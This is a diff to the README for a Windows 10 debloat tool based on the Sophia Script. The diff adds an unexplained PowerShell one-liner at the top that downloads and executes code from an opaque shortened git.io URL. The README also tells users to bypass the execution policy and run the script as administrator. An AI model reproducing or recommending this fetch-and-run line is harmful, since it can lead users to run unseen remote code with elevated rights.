@@ -1,3 +1,8 @@
+
+```
+iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JLAMf'))
+```
+
 File: README.TXT for Windows 10 Debloat tool GUI / Debloater (v1.3) from www.BenchTweakGaming.com
 Based on farag2 Windows 10 Sophia Script v5.2 (Nov 11, 2020): https://github.com/farag2/Windows-10-Sophia-Script
 
@@ -34,6 +39,7 @@ OR save the PowerShell script as ‘Sophia.ps1’ with the other files (see head
 the following commands.
 
 Launch PowerShell (Run as administrator) and navigate to where your script is.
+
 
 1. Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 2. ./Sophia.ps1
